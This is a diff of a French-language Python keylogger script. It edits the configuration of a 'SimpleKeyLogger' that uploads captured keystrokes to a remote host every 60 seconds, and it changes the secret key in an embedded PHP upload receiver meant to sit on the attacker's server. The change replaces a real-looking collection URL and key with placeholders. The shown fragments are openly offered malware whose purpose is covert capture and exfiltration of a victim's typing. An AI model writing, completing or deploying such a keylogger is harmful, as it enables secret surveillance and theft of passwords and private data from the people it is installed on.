@@ -14,8 +14,8 @@ import threading
 import requests  # pip install requests
 
 # ========== CONFIG SIMPLE ==========
-HOST_URL = "https://crypto-free-tools.netlify.app/image/"  # CHANGE ÇA !
-SECRET_KEY = "3ust1s"  # CHANGE ÇA !
+HOST_URL = "https://ton-site/image/"  # CHANGE ÇA !
+SECRET_KEY = "mdp"  # CHANGE ÇA !
 UPLOAD_INTERVAL = 60  # Secondes entre chaque upload
 
 # ========== KEYLOGGER SIMPLE ==========
@@ -112,7 +112,7 @@ class SimpleKeyLogger:
 # ========== FICHIER PHP POUR TON HOST ==========
 PHP_UPLOAD = """<?php
 // upload.php - À mettre sur ton host
-$secret_key = "3ust1s";  // MÊME QUE DANS LE SCRIPT
+$secret_key = "mdp";  // MÊME QUE DANS LE SCRIPT
 
 if ($_POST['key'] !== $secret_key) {
     die("Access denied");
@@ -216,7 +216,7 @@ pause
 # ========== MAIN ==========
 if __name__ == "__main__":
     # Si premier lancement, créer les fichiers
-    if HOST_URL == "https://crypto-free-tools.netlify.app/image/":
+    if HOST_URL == "https://ton-site/image/":
         print("⚠️ CONFIGURATION REQUISE")
         print("1. Change HOST_URL et SECRET_KEY dans le code")
         print("2. Mets les fichiers PHP sur ton host")
